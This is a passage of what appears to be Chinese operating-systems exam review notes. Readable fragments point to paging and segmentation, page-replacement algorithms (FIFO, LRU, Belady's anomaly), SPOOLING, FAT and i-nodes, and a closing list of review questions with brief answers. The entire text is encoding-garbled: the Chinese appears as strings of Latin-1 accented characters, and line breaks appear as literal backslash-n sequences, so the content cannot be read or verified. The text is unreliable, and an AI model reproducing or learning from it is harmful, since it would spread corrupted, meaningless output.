æ³•åˆ©ç”¨`çš„å°å­˜å‚¨å—\n\n**4ã€å¸¸ç”¨åˆ†åŒºåˆ†é…ç®—æ³•åŠå¯¹åº”çš„ç©ºé—²åŒºæ’åˆ—æ–¹å¼**\n\né¦–æ¬¡é€‚åº”ç®—æ³•ï¼šç©ºé—²åŒºé“¾è¡¨æŒ‰åœ°å€ä»ä½åˆ°é«˜æ’åºï¼Œæ”¾å…¥åˆ°ä¸»å­˜ä¸­`ç¬¬ä¸€ä¸ªè¶³å¤Ÿè£…å…¥å®ƒçš„åœ°å€æœ€ä½çš„ç©ºé—²åŒºã€‚`\n\n- æœ€ä½³é€‚åº”ç®—æ³•ï¼šæŒ‰å¤§å°ä»å°åˆ°å¤§æ’åºï¼Œæ”¾åˆ°ä¸å®ƒ`å¤§å°æœ€æ¥è¿‘çš„ç©ºé—²åŒºã€‚`\n- æœ€åé€‚åº”ç®—æ³•ï¼šæŒ‰å¤§å°ä»å¤§åˆ°å°æ’åºï¼Œæ”¾åˆ°ä¸å®ƒæ‰€éœ€ç©ºé—´`å·®è·æœ€å¤§çš„ç©ºé—²åŒºã€‚`\n\n![](https://img.jwt1399.top//img/20201220161254.png)\n\n**5ã€åŸºæœ¬åˆ†é¡µï¼ˆåˆ†æ®µã€æ®µé¡µå¼ï¼‰çš„æ¦‚å¿µã€é¡µï¼ˆæ®µï¼‰è¡¨çš„ä½œç”¨ã€åœ°å€å˜æ¢**\n\nåˆ†é¡µå¼ï¼š\n\n- è™šé¡µï¼šç¨‹åºçš„åœ°å€ç©ºé—´è¢«ç­‰åˆ†æˆå¤§å°ç›¸ç­‰çš„ç‰‡ï¼Œç§°ä¸ºé¡µé¢ï¼Œåˆç§°ä¸ºè™šé¡µã€‚\n- å®é¡µï¼šä¸»å­˜è¢«ç­‰åˆ†æˆå¤§å°ç›¸ç­‰çš„ç‰‡ï¼Œç§°ä¸ºä¸»å­˜å—ï¼Œåˆç§°ä¸ºå®é¡µã€‚\n- é¡µè¡¨ï¼šä¸ºäº†å®ç°ä»åœ°å€ç©ºé—´åˆ°ç‰©ç†ä¸»å­˜çš„æ˜ è±¡ï¼Œç³»ç»Ÿå»ºç«‹çš„è®°å½•é¡µä¸å†…å­˜å—ä¹‹é—´å¯¹åº”å…³ç³»çš„åœ°å€å˜æ¢çš„æœºæ„ç§°ä¸ºé¡µé¢æ˜ åƒè¡¨ï¼Œç®€ç§°é¡µè¡¨ã€‚\n- åˆ†é¡µç³»ç»Ÿä¸­ï¼Œåœ°å€å˜æ¢ä¸»è¦é€šè¿‡é¡µè¡¨æ¥å®ç°ï¼Œæ•…ä¹Ÿå«åœ°å€å˜æ¢è¡¨æˆ–åœ°å€æ˜ å°„è¡¨ã€‚\n- é¡µè¡¨åŒ…æ‹¬é¡µå·å’Œå—å·ã€‚\n- è™šåœ°å€ç»“æ„åŒ…æ‹¬ï¼šé¡µå·+é¡µå†…ä½ç§»ã€‚å˜æ¢è¿‡ç¨‹ç”±æ“ä½œç³»ç»Ÿå®Œæˆã€‚\n\nåˆ†æ®µå¼ï¼š\n\n- åˆ†æ®µæ˜¯ç¨‹åºä¸­è‡ªç„¶åˆ’åˆ†çš„ä¸€ç»„é€»è¾‘æ„ä¹‰å®Œæ•´çš„ä¿¡æ¯é›†åˆï¼Œå¦‚æ•°æ®æ®µã€ä»£ç æ®µã€æ ˆæ®µã€‚\n- åˆ†æ®µå¼ç¨‹åºåœ°å€ç©ºé—´ç”±è‹¥å¹²ä¸ªé€»è¾‘åˆ†æ®µç»„æˆï¼Œæ¯ä¸ªåˆ†æ®µæœ‰è‡ªå·±çš„åå­—ï¼Œå¯¹äºä¸€ä¸ªåˆ†æ®µè€Œè¨€ï¼Œå®ƒæ˜¯ä¸€ä¸ªè¿ç»­çš„åœ°å€åŒºã€‚\n- æ®µè¡¨åŒ…æ‹¬æ®µå·é•¿åº¦å’ŒåŸºå€ã€‚\n- æ®µå¼åœ°å€ç»“æ„åŒ…æ‹¬ï¼šæ®µå·+æ®µå†…ä½ç§»ã€‚\n\næ®µé¡µå¼ï¼š\n\n- åœ¨ä¸€ä¸ªåˆ†æ®µå†…åˆ’åˆ†é¡µé¢å°±å½¢æˆäº†æ®µé¡µå¼å­˜å‚¨ç®¡ç†ã€‚\n\n**6ã€åˆ†é¡µä¸åˆ†æ®µçš„åŒºåˆ«ã€å„è‡ªçš„ä¼˜ç¼ºç‚¹**\n\n![](https://img.jwt1399.top//img/20201220161307.png)\n\n**7ã€å¿«è¡¨çš„ä½œç”¨ã€å†…å­˜è®¿é—®æ—¶é—´çš„è®¡ç®—**\n\n![](https://img.jwt1399.top//img/20201220161320.png)\n\n**8ã€è™šæ‹Ÿå­˜å‚¨å™¨çš„åŸºæœ¬æ¦‚å¿µã€ç†è®ºä¾æ®ã€åŸºæœ¬ç‰¹å¾åŠå…³é”®æŠ€æœ¯**\n\nç”±æ“ä½œç³»ç»Ÿå’Œç¡¬ä»¶ç›¸é…åˆæ¥å®Œæˆä¸»å­˜å’Œè¾…å­˜ä¹‹é—´çš„ä¿¡æ¯çš„åŠ¨æ€è°ƒåº¦ã€‚è¿™æ ·çš„è®¡ç®—æœºç³»ç»Ÿå¥½åƒä¸ºç”¨æˆ·æä¾›äº†ä¸€ä¸ªå…¶å­˜å‚¨å®¹é‡æ¯”å®é™…ä¸»å­˜å¤§å¾—å¤šçš„å­˜å‚¨å™¨ï¼Œè¿™ä¸ªå­˜å‚¨å™¨ç§°ä¸ºè™šæ‹Ÿå­˜å‚¨å™¨ã€‚\nå­˜å‚¨å®¹é‡ç”±è®¡ç®—æœºåœ°å€ç»“æ„å’Œå­˜å‚¨å¤§å°å…±åŒå†³å®š\n\nç†è®ºä¾æ®æ˜¯ç¨‹åºçš„å±€éƒ¨æ€§ç‰¹å¾\n\nåŸºæœ¬ç‰¹å¾ï¼šç¦»æ•£å‹ã€å¤šæ¬¡æ€§ã€å¯¹æ¢æ€§å’Œè™šæ‹Ÿæ€§\nå…¶ä¸­ç¦»æ•£æ€§æ˜¯å…¶æœ€åŸºæœ¬çš„å±æ€§ï¼Œåœ¨ç¦»æ•£æ€§çš„åŸºç¡€ä¸Šåˆå½¢æˆäº†å¤šæ¬¡æ€§å’Œå¯¹æ¢æ€§ä¸¤ä¸ªç‰¹å¾ï¼Œè€Œè™šæ‹Ÿå­˜å‚¨å™¨èƒ½å¤Ÿè¡¨ç°å‡ºçš„æœ€é‡è¦çš„ç‰¹å¾æ˜¯è™šæ‹Ÿæ€§ã€‚\n\nå…³é”®æŠ€æœ¯ï¼šåˆ†é¡µï¼ˆé¡µè¡¨æœºæ„ã€ç¼ºé¡µä¸­æ–­ã€åœ°å€å˜æ¢ï¼‰\nåˆ†æ®µï¼ˆæ®µè¡¨æœºæ„ã€ç¼ºæ®µæœºæ„ã€åœ°å€å˜æ¢ï¼‰\n\n**9ã€é¡µé¢ç½®æ¢ç®—æ³•ã€ç¼ºé¡µç‡è®¡ç®—ã€LRU ç®—æ³•çš„ç¡¬ä»¶å®ç°æ–¹æ³•ã€æŠ–åŠ¨ã€Belady å¼‚å¸¸ã€ç¼ºé¡µä¸­æ–­**\n\nç”¨æ¥é€‰æ‹©æ·˜æ±°å“ªä¸€é¡µçš„è§„åˆ™å«åšç½®æ¢ç­–ç•¥ï¼Œæˆ–ç§°æ·˜æ±°ç®—æ³•\n\né¢ ç°¸åˆç§°ä¸ºâ€œæŠ–åŠ¨â€\n\nç®€å•åœ°è¯´ï¼Œå¯¼è‡´ç³»ç»Ÿæ•ˆç‡æ€¥å‰§ä¸‹é™çš„ä¸»å­˜å’Œè¾…å­˜ä¹‹é—´çš„é¢‘ç¹é¡µé¢ç½®æ¢ç°è±¡ç§°ä¸ºâ€œæŠ–åŠ¨â€\n\nç¼ºé¡µç‡ï¼š\n\n![](https://img.jwt1399.top//img/20201220161336.png)\n\né¡µé¢ç½®æ¢ç®—æ³•ï¼š\n\næœ€ä½³é¡µé¢ç½®æ¢ç®—æ³•ï¼ˆOPTï¼‰ã€å…ˆè¿›å…ˆå‡ºç½®æ¢ç®—æ³•ï¼ˆFIFOï¼‰ã€æœ€è¿‘æœ€ä¹…æœªä½¿ç”¨ç½®æ¢ç®—æ³•ï¼ˆLRUï¼‰\n\nBeladyå¼‚å¸¸ï¼šæŒ‡åœ¨ä½¿ç”¨FIFOç®—æ³•è¿›è¡Œå†…å­˜é¡µé¢ç½®æ¢æ—¶ï¼Œåœ¨æœªç»™è¿›ç¨‹æˆ–ä½œä¸šåˆ†é…è¶³å®ƒæ‰€è¦æ±‚çš„å…¨éƒ¨é¡µé¢çš„æƒ…å†µä¸‹ï¼Œæœ‰æ—¶å‡ºç°çš„åˆ†é…çš„é¡µé¢æ•°å¢å¤šï¼Œç¼ºé¡µæ¬¡æ•°åè€Œå¢åŠ çš„å¥‡æ€ªç°è±¡ã€‚\n\nç¼ºé¡µä¸­æ–­ï¼š\n\n![](https://img.jwt1399.top//img/20201220161350.png)\n\n\næŸ¥æ‰¾é¡µè¡¨æ—¶ï¼Œä¸­æ–­ä¸º1ï¼Œé¡µå·å¯¹åº”çš„å¿«ä¸åœ¨ä¸»å­˜ä¸­ï¼Œå‘ç”Ÿç¼ºé¡µä¸­æ–­ã€‚æ­¤æ—¶ç”¨æˆ·ç¨‹åºè¢«ä¸­æ–­ï¼Œæ§åˆ¶æƒè½¬åˆ°æ“ä½œç³»ç»Ÿçš„è°ƒé¡µç¨‹åºï¼Œå°†é¡µé¢ä»é¡µè¡¨æä¾›çš„ç›˜åŒºåœ°å€è°ƒå…¥ä¸»å­˜çš„æŸå—ä¸­ï¼Œå¹¶æ›´æ–°é¡µè¡¨ã€‚\n\nLRUç®—æ³•çš„ç¡¬ä»¶å®ç°æ–¹æ³•\n\n![image-20200320092127174](https://img.jwt1399.top//img/20201220161412.png)\n\n![](https://img.jwt1399.top//img/20201220161426.png)\n\n![](https://img.jwt1399.top//img/20201220161436.png)\n\n\n## ç¬¬äº”ç«  è®¾å¤‡ç®¡ç†\n**1ã€è®¾å¤‡ç®¡ç†çš„ä»»åŠ¡ã€åŠŸèƒ½åŠç›®æ ‡**\n\nä»»åŠ¡ï¼šå®ç°å¤–éƒ¨è®¾å¤‡çš„å…±äº«ï¼Œå¹¶æœ‰æ•ˆåœ°å®Œæˆå„è‡ªæ‰€éœ€çš„ä¼ è¾“å·¥ä½œã€‚\n\nåŠŸèƒ½ï¼šçŠ¶æ€è·Ÿè¸ªï¼ˆåŠ¨æ€è®°å½•å„ç§è®¾å¤‡çš„çŠ¶æ€ï¼‰\nè®¾å¤‡åˆ†é…ä¸å›æ”¶ï¼ˆé™æ€åˆ†é…ï¼šç¨‹åºè¿›å…¥ç³»ç»Ÿæ—¶è¿›è¡Œåˆ†é…ï¼Œé€€å‡ºç³»ç»Ÿæ—¶æ”¶å›å…¨éƒ¨èµ„æº\nåŠ¨æ€åˆ†é…ï¼šè¿›ç¨‹æå‡ºç”³è¯·æ—¶è¿›è¡Œåˆ†é…ï¼Œä½¿ç”¨å®Œæ¯•åç«‹å³æ”¶å›ï¼‰\nè®¾å¤‡æ§åˆ¶ï¼ˆå®æ–½è®¾å¤‡é©±åŠ¨å’Œä¸­æ–­å¤„ç†çš„å·¥ä½œï¼‰ã€‚\n\nç›®æ ‡ï¼šæé«˜è®¾å¤‡åˆ©ç”¨ç‡ã€æ–¹ä¾¿ç”¨æˆ·ä½¿ç”¨ã€‚\n\n**2ã€I/O è®¾å¤‡çš„åˆ†ç±»ï¼Œè®¾å¤‡ã€æ§åˆ¶å™¨åŠé€šé“çš„å…³ç³»**\n\nåˆ†ç±»ï¼š\n\n- (1) å­˜å‚¨è®¾å¤‡\n  - å­˜å‚¨è®¾å¤‡åˆç§°å—è®¾å¤‡ï¼Œæ˜¯å­˜å‚¨ä¿¡æ¯çš„è®¾å¤‡ï¼Œå¦‚ï¼šç£ç›˜ã€ç£é¼“ (ä»¥å—ä¸ºå•ä½ä¼ è¾“ä¿¡æ¯) ã€‚\n\n- (2) è¾“å…¥è¾“å‡ºè®¾å¤‡\n  - è¾“å‡ºè®¾å¤‡åˆç§°å­—ç¬¦è®¾å¤‡ï¼Œèƒ½å°†ä¿¡æ¯ä»è®¡ç®—æœºå¤–éƒ¨è¾“å…¥åˆ°æœºå†…ï¼Œæˆ–åä¹‹ï¼Œå¦‚ï¼šé”®ç›˜ã€æ˜¾ç¤ºå™¨ã€æ‰“å°æœº (ä»¥å­—ç¬¦ä¸ºå•ä½ä¼ è¾“ä¿¡æ¯) ã€‚\n\n- (3) é€šä¿¡è®¾å¤‡\n  - é€šä¿¡è®¾å¤‡è´Ÿè´£è®¡ç®—æœºä¹‹é—´çš„ä¿¡æ¯ä¼ è¾“ï¼Œå¦‚è°ƒåˆ¶è§£è°ƒå™¨ã€ç½‘å¡ç­‰ã€‚\n\nè®¾å¤‡æ˜¯ç”±è®¾å¤‡æ§åˆ¶å—è¡¨ç¤ºçš„ä¸€ä¸ªå®ä½“ã€‚\n\næ§åˆ¶å™¨æ˜¯ç”¨äºæ“ä½œç«¯å£ã€æ€»çº¿æˆ–è®¾å¤‡çš„ä¸€ç»„ç”µå­å™¨ä»¶ã€‚ç”¨äºæ§åˆ¶è®¾å¤‡ä¸ä¸»æœºé€šä¿¡ä¸æ•°æ®äº¤æ¢ã€‚\n\né€šé“æ˜¯ç”¨æ¥æ§åˆ¶å¤–éƒ¨è®¾å¤‡äºä¸»å­˜ä¹‹é—´è¿›è¡Œæˆæ‰¹æ•°æ®ä¼ è¾“çš„éƒ¨ä»¶ï¼Œåˆç§°ä¸ºI/Oå¤„ç†æœºã€‚å®ƒæ¥é€CPUå‘½ä»¤åˆç‹¬ç«‹äºCPUå·¥ä½œã€‚\n\n**3ã€é€šé“çš„åŸºæœ¬æ¦‚å¿µåŠåˆ†ç±»**\n\næ¦‚å¿µï¼šé€šé“æ˜¯ç”¨æ¥æ§åˆ¶å¤–éƒ¨è®¾å¤‡ä¸ä¸»å­˜ä¹‹é—´è¿›è¡Œæˆæ‰¹æ•°æ®ä¼ è¾“çš„éƒ¨ä»¶ï¼Œåˆç§°ä¸ºI/Oå¤„ç†æœº\n\nåˆ†ç±»ï¼šå­—èŠ‚å¤šè·¯é€šé“ã€æ•°ç»„é€‰æ‹©é€šé“ã€æ•°ç»„å¤šè·¯é€šé“\n\n![](https://img.jwt1399.top//img/20201220161447.png)\n\n**4ã€I/O æ§åˆ¶æ–¹å¼åŠæ¨åŠ¨å‘å±•çš„å› ç´ ã€å„è‡ªé€‚ç”¨çš„åœºåˆåŠè®¾å¤‡ç±»å‹**\n\n![](https://img.jwt1399.top//img/20201220161459.png)\n\n**5ã€ç¼“å†²åŒºçš„æ¦‚å¿µã€åˆ†ç±»åŠå¼•å…¥ç›®çš„**\n\nç¼“å†²æ˜¯ä¸¤ç§ä¸åŒé€Ÿåº¦çš„è®¾å¤‡ä¹‹é—´ä¼ è¾“ä¿¡æ¯æ—¶å¹³æ»‘ä¼ è¾“è¿‡ç¨‹çš„å¸¸ç”¨æ‰‹æ®µã€‚\nåˆ†ä¸ºç¼“å†²å™¨ï¼ˆç¡¬ä»¶å­˜å‚¨è£…ç½®ï¼‰å’Œè½¯ä»¶ç¼“å†²ï¼ˆä¸´æ—¶å­˜æ”¾I/Oæ•°æ®çš„ä¸€å—å­˜å‚¨åŒºåŸŸï¼‰ã€‚\nç”¨äºå¤„ç†æ•°æ®æµçš„ç”Ÿäº§è€…ä¸æ¶ˆè´¹è€…é—´çš„é€Ÿåº¦å·®å¼‚ï¼Œåè°ƒä¼ è¾“æ•°æ®å¤§å°ä¸ä¸€è‡´çš„è®¾å¤‡ï¼Œåº”ç”¨ç¨‹åºçš„æ‹·è´è¯­ä¹‰ã€‚\n\nç›®çš„ï¼š\n\n- ï¼ˆ1ï¼‰ç¼“å’ŒCPUå’ŒI/Oè®¾å¤‡ä¹‹é—´é€Ÿåº¦ä¸åŒ¹é…çš„çŸ›ç›¾\n- ï¼ˆ2ï¼‰å‡å°‘ä¸­æ–­CPUçš„é¢‘ç‡ï¼Œæ”¾å®½å¯¹CPUä¸­æ–­å“åº”æ—¶é—´çš„é™åˆ¶\n- ï¼ˆ3ï¼‰æé«˜CPUå’ŒI/Oè®¾å¤‡çš„å¹¶è¡Œæ€§\n\n**6ã€I/O è½¯ä»¶çš„å±‚æ¬¡ã€å„å±‚ä¸»è¦åŠŸèƒ½ã€è®¾å¤‡ç‹¬ç«‹æ€§çš„æ¦‚å¿µ**\n\nè¯·æ±‚I/Oçš„è¿›ç¨‹ã€I/Oè¿‡ç¨‹ã€è®¾å¤‡å¤„ç†è¿›ç¨‹ã€ä¸­æ–­å¤„ç†ç¨‹åºã€‚\n\næ‰€è°“è®¾å¤‡ç‹¬ç«‹æ€§æ˜¯æŒ‡ï¼Œç”¨æˆ·åœ¨ç¨‹åºä¸­ä½¿ç”¨çš„è®¾å¤‡ä¸å®é™…ä½¿ç”¨çš„è®¾å¤‡æ— å…³ï¼Œä¹Ÿå°±æ˜¯åœ¨ç”¨æˆ·ç¨‹åºä¸­ä»…ä½¿ç”¨é€»è¾‘è®¾å¤‡åã€‚\n\n**7ã€SPOOLING æŠ€æœ¯çš„æ¦‚å¿µã€ä½œç”¨åŠ SPOOLING ç³»ç»Ÿçš„ç»„æˆ**\n\nåˆ©ç”¨é€šé“å’Œä¸­æ–­æŠ€æœ¯ï¼Œåœ¨ä¸»æœºæ§åˆ¶ä¹‹ä¸‹ï¼Œç”±é€šé“å®Œæˆè¾“å…¥è¾“å‡ºå·¥ä½œã€‚ç³»ç»Ÿæä¾›ä¸€ä¸ªè½¯ä»¶ç³»ç»Ÿ (åŒ…æ‹¬é¢„è¾“å…¥ç¨‹åºã€ç¼“è¾“å‡ºç¨‹åºã€äº•ç®¡ç†ç¨‹åºã€é¢„è¾“å…¥è¡¨ã€ç¼“è¾“å‡ºè¡¨)ã€‚å®ƒæä¾›è¾“å…¥æ”¶å­˜å’Œè¾“å‡ºå‘é€çš„åŠŸèƒ½ï¼Œä½¿å¤–éƒ¨è®¾å¤‡å¯ä»¥å¹¶è¡Œæ“ä½œã€‚è¿™ä¸€è½¯ä»¶ç³»ç»Ÿç§°ä¸ºSPOOLINGç³»ç»Ÿã€‚\n\nSPOOLINGç³»ç»Ÿæä¾›å¤–å›´è®¾å¤‡åŒæ—¶è”æœºæ“ä½œçš„åŠŸèƒ½ï¼Œæé«˜ç‹¬å è®¾å¤‡åˆ©ç”¨ç‡ã€‚\n\nç»„æˆåŒ…æ‹¬é¢„è¾“å…¥ç¨‹åºã€ç¼“è¾“å‡ºç¨‹åºã€äº•ç®¡ç†ç¨‹åºã€é¢„è¾“å…¥è¡¨ã€ç¼“è¾“å‡ºè¡¨ï¼›\n\n**8ã€ç£ç›˜è®¿é—®è¿‡ç¨‹åŠè®¿é—®æ—¶é—´çš„ç¡®å®šã€å—å·ä¸æŸ±é¢ã€ç£é“ã€æ‰‡åŒºå·çš„å¯¹åº”å…³ç³»ã€ç£ç›˜è°ƒåº¦ç®—æ³•åŠå…¶è®¡ç®—ï¼›æ‰‡åŒºçš„ä¼˜åŒ–**\n\n## ç¬¬å…­ç«  æ–‡ä»¶ç®¡ç†\n\n**1ã€æ–‡ä»¶ç³»ç»Ÿçš„ç»„æˆã€åŠŸèƒ½**\n\nç»„æˆï¼šç®¡ç†æ–‡ä»¶æ‰€éœ€çš„æ•°æ®ç»“æ„ã€ç®¡ç†ç¨‹åºã€ä¸€ç»„æ“ä½œã€‚\nåŠŸèƒ½ï¼šç”¨æˆ·è§’åº¦â€”â€œæŒ‰åå­˜å–â€ï¼›ç³»ç»Ÿè§’åº¦â€”è¾…å­˜ç©ºé—´ç®¡ç†ã€æ„é€ æ–‡ä»¶ç»“æ„ã€æä¾›æ–‡ä»¶å­˜å–æ–¹æ³•ã€æ–‡ä»¶ä¿æŠ¤ã€æä¾›æ–‡ä»¶å…±äº«åŠŸèƒ½ã€æä¾›æ–‡ä»¶æ“ä½œå‘½ä»¤ã€‚\n\n**2ã€æ‰“å¼€ã€å…³é—­æ“ä½œçš„ç›®çš„**\n\næ‰€è°“æ‰“å¼€æ–‡ä»¶å°±æ˜¯æŠŠè¯¥æ–‡ä»¶çš„æœ‰å…³ç›®å½•è¡¨ç›®å¤åˆ¶åˆ°ä¸»å­˜ä¸­çº¦å®šçš„åŒºåŸŸï¼Œå»ºç«‹æ–‡ä»¶æ§åˆ¶å—ï¼Œå»ºç«‹ç”¨æˆ·å’Œè¿™ä¸ªæ–‡ä»¶çš„è”ç³»ã€‚\næ‰€è°“å…³é—­æ–‡ä»¶å°±æ˜¯ç”¨æˆ·å®£å¸ƒè¿™ä¸ªæ–‡ä»¶å½“å‰ä¸å†ä½¿ç”¨ï¼Œç³»ç»Ÿå°†å…¶åœ¨ä¸»å­˜ä¸­çš„æ–‡ä»¶æ§åˆ¶å—åˆ å»ï¼Œå› è€Œä¹Ÿå°±åˆ‡æ–­äº†ç”¨æˆ·åŒè¿™ä¸ªæ–‡ä»¶çš„è”ç³»ã€‚\n\n**3ã€æ–‡ä»¶é€»è¾‘ç»“æ„ã€ç‰©ç†ç»“æ„çš„åˆ†ç±»**\n\næ–‡ä»¶é€»è¾‘ç»“æ„æ˜¯ä»ç”¨æˆ·è§’åº¦çœ‹åˆ°çš„æ–‡ä»¶é¢è²Œã€‚å³ç”¨æˆ·å¯¹ä¿¡æ¯è¿›è¡Œé€»è¾‘ç»„ç»‡å½¢æˆçš„æ–‡ä»¶ç»“æ„ã€‚åŒ…æ‹¬æµå¼æ–‡ä»¶ã€è®°å½•å¼æ–‡ä»¶ã€‚\næ–‡ä»¶çš„ç‰©ç†ç»“æ„æ˜¯ä¿¡æ¯åœ¨ç‰©ç†å­˜å‚¨å™¨ä¸Šçš„å­˜å‚¨æ–¹å¼ï¼Œæ˜¯æ•°æ®çš„ç‰©ç†è¡¨ç¤ºå’Œç»„ç»‡ã€‚åŒ…æ‹¬è¿ç»­æ–‡ä»¶ã€ä¸²è”æ–‡ä»¶ã€ç´¢å¼•æ–‡ä»¶ç»“æ„ã€‚\n\n**4ã€FAT è¡¨çš„ä½œç”¨ã€FAT è¡¨å¤§å°çš„è®¡ç®—**\n\n**5ã€æ··åˆç´¢å¼•åˆ†é…æ–¹å¼çš„ç»“æ„åŠç›¸å…³è®¡ç®—**\n\n**6ã€æ–‡ä»¶çš„ç›®å½•ç»“æ„ã€ç´¢å¼•èŠ‚ç‚¹åŠæ–‡ä»¶æ§åˆ¶å—çš„ä½œç”¨**\n\næ–‡ä»¶ç›®å½•æ˜¯è®°å½•æ–‡ä»¶çš„åå­—ã€å­˜æ”¾åœ°å€åŠå…¶ä»–æœ‰å…³æ–‡ä»¶çš„è¯´æ˜ä¿¡æ¯å’Œæ§åˆ¶ä¿¡æ¯çš„æ•°æ®ç»“æ„ã€‚\næ–‡ä»¶ç›®å½•å°†æ¯ä¸ªæ–‡ä»¶çš„ç¬¦å·åå’Œä»–ä»¬åœ¨è¾…å­˜ç©ºé—´çš„ç‰©ç†åœ°å€ä¸æœ‰å…³æ–‡ä»¶æƒ…å†µçš„è¯´æ˜ä¿¡æ¯è”ç³»èµ·æ¥äº†ã€‚\nåˆ†ä¸ºä¸€çº§æ–‡ä»¶ç›®å½•å’Œæ ‘å½¢æ–‡ä»¶ç›®å½•ã€‚\n\nUNIXç³»ç»ŸæŠŠæ–‡ä»¶ç›®å½•é¡¹ä¸­é™¤äº†åå­—ä»¥å¤–çš„ä¿¡æ¯å…¨éƒ¨å­˜æ”¾åˆ°ä¸€ä¸ªç£ç›˜çš„æ•°æ®å—ä¸Šï¼Œè¿™ç§æ•°æ®å—å°±æ˜¯æ–‡ä»¶ç´¢å¼•èŠ‚ç‚¹ (indexnode)ï¼Œç®€ç§°ièŠ‚ç‚¹ï¼Œåˆç§°ä¸ºç£ç›˜ç´¢å¼•èŠ‚ç‚¹ã€‚åœ¨ç›®å½•é¡¹ä¸­åªæœ‰æ–‡ä»¶çš„åå­—å’Œå¯¹åº”ièŠ‚ç‚¹çš„ç¼–å·ã€‚\n\næ–‡ä»¶æ§åˆ¶å—è®°å½•æ–‡ä»¶å½“å‰å„ç§çŠ¶æ€ã€‚\n\n**7ã€æ–‡ä»¶ç©ºé—²åŒºçš„ç®¡ç†æ–¹æ³•ï¼ˆç©ºé—²è¡¨ã€ç©ºé—²é“¾ã€ä½ç¤ºå›¾ä¸æˆç»„é“¾æ¥æ³•ï¼‰**\n\nç©ºé—²ç£ç›˜å—ç®¡ç†é‡‡ç”¨æˆç»„é“¾æ¥æ³•ï¼Œå³å°†ç©ºé—²è¡¨å’Œç©ºé—²é“¾ä¸¤ç§æ–¹æ³•ç›¸ç»“åˆã€‚ç³»ç»Ÿåˆå¯æ—¶ï¼Œæ–‡ä»¶å­˜å‚¨åŒºæ˜¯ç©ºé—²ã€‚å°†ç©ºé—²å—ä»å°¾å€’å‘å‰ï¼Œæ¯100å—åˆ†ä¸ºä¸€ç»„ (æ³¨ï¼šæœ€åä¸€ç»„ä¸º99å—)ï¼Œæ¯ä¸€ç»„çš„æœ€åä¸€å—ä½œä¸ºç´¢å¼•è¡¨ï¼Œç”¨æ¥ç™»è®°ä¸‹ä¸€ç»„100å—çš„ç‰©ç†å—å·å’Œå—æ•°ã€‚é‚£ä¹ˆï¼Œæœ€å‰é¢çš„ä¸€ç»„å¯èƒ½ä¸è¶³100å—ï¼Œè¿™ä¸€ç»„çš„ç‰©ç†å—å·å’Œå—æ•°å­˜æ”¾åœ¨ç®¡ç†å—çš„s_free[100]å’Œs_nfreeä¸­ã€‚        \n\n## æ“ä½œç³»ç»Ÿå‚è€ƒå¤ä¹ é¢˜\n\n##### æ“ä½œç³»ç»Ÿçš„åŸºæœ¬åŠŸèƒ½åŒ…æ‹¬ä»€ä¹ˆå†…å®¹ï¼Ÿ ï¼ˆå¡«ï¼‰\nå¤„ç†æœºç®¡ç†ã€å­˜å‚¨å™¨ç®¡ç†ã€è®¾å¤‡ç®¡ç†ã€æ–‡ä»¶ç³»ç»Ÿç®¡ç†ï¼Œä¸ºç”¨æˆ·ä½¿ç”¨æ“ä½œç³»ç»Ÿæä¾›äº†ç”¨æˆ·æ¥å£\n##### ä»€ä¹ˆæ˜¯ä½œä¸šè°ƒåº¦ï¼Ÿä½œä¸šè°ƒåº¦ç®—æ³•åŒ…æ‹¬å‡ ç§ï¼Ÿ(åˆ¤ã€å¡«ï¼‰ \nä½œä¸šè°ƒåº¦ç§°ä¸ºå®è§‚è°ƒåº¦ï¼Œå…¶ä»»åŠ¡æ˜¯å¯¹æäº¤ç»™ç³»ç»Ÿçš„ã€å­˜æ”¾åœ¨è¾…å­˜è®¾å¤‡ä¸Šçš„å¤§é‡ä½œä¸šä»¥ä¸€å®šçš„ç­–ç•¥è¿›è¡ŒæŒ‘é€‰ï¼Œåˆ†é…ä¸»å­˜ç­‰å¿…è¦çš„èµ„æºï¼Œå»ºç«‹ä½œä¸šå¯¹åº”çš„è¿›ç¨‹ï¼Œä½¿å…¶æŠ•å…¥è¿è¡Œã€‚\n\nå…ˆæ¥å…ˆæœåŠ¡ï¼Œæ®µä½œä¸šä¼˜å…ˆï¼Œæœ€é«˜å“åº”æ¯”ä¼˜å…ˆ\n\n##### åœ¨æ“ä½œç³»ç»Ÿçš„å¤„ç†å™¨ç®¡ç†ä¸­ï¼Œæ¯ä¸€ä¸ªè¿›ç¨‹å”¯ä¸€çš„æ ‡å¿—æ˜¯ä»€ä¹ˆï¼Ÿ ï¼ˆé€‰ï¼‰\nPCB\n##### ä»€ä¹ˆæ˜¯ä¸´ç•Œèµ„æºï¼Ÿæœ‰ä»€ä¹ˆç‰¹ç‚¹ï¼Ÿ ï¼ˆç®€ç­”ï¼‰\nä¸€æ®µæ—¶é—´å†…åªå…è®¸ä¸€ä¸ªè¿›ç¨‹ä½¿ç”¨çš„èµ„æº\n##### ä»€ä¹ˆæ˜¯å…±äº«å˜é‡ï¼Ÿ ï¼ˆåˆ¤ï¼‰\n##### è¿›ç¨‹æ‰€è¯·æ±‚ä¸€æ¬¡æ‰“å°è¾“å‡ºç»“æŸåï¼Œå°†ä½¿è¿›ç¨‹çŠ¶æ€ä»ä»€ä¹ˆæ€å˜ä¸ºä»€ä¹ˆæ€ï¼Ÿï¼ˆé€‰ï¼‰\nç­‰å¾…æ€å˜ä¸ºå°±ç»ªæ€\n##### è¿›ç¨‹æ§åˆ¶å—ä¸­çš„ç°åœºä¿¡æ¯æ˜¯ä¿å­˜çš„ä»€ä¹ˆä¿¡æ¯ï¼Ÿ ï¼ˆé€‰ï¼‰\n\nå·¥ä½œå¯„å­˜å™¨ã€æŒ‡ä»¤è®¡æ•°å™¨ä»¥åŠç¨‹åºçŠ¶æ€å­—\n##### ä»€ä¹ˆæ˜¯è¿›ç¨‹åŒæ­¥ï¼Ÿè¿›ç¨‹åŒæ­¥æ˜¯æŒ‡è¿›ç¨‹é—´åœ¨é€»è¾‘ä¸Šçš„ä»€ä¹ˆå…³ç³»ï¼Ÿï¼ˆç®€ç­”é¢˜ï¼‰\nå¹¶å‘è¿›ç¨‹åœ¨ä¸€äº›å…³é”®ç‚¹ä¸Šå¯èƒ½éœ€è¦äº’ç›¸ç­‰å¾…ä¸äº’é€šæ¶ˆæ¯\nç›´æ¥åˆ¶çº¦\n\n##### ä»€ä¹ˆæ˜¯åŸè¯­ï¼ŸPã€V æ“ä½œæ˜¯åŸè¯­å—ï¼Ÿä»–ä»¬çš„ç‰©ç†æ„ä¹‰æ˜¯ä»€ä¹ˆï¼Ÿ  